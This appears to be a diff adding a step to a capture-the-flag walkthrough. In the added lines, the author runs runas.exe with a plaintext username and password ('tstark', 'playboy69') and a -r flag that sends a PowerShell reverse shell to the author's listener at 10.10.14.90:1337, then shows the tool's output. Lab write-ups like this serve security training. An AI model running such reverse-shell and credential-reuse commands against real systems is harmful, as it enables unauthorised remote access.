@@ -557,5 +557,16 @@ penelope -p 1337
 Now ill start another listener on my machine
 
 ```python
+PS C:\Users\web_account\Documents> .\runas.exe tstark playboy69 powershell.exe -r 10.10.14.90:1337
+[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-92463$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6300 created in background.
+PS C:\Users\web_account\Documents> 
+```
+This has sent a powershell session back to my listener!
+
+```python
 
 ```
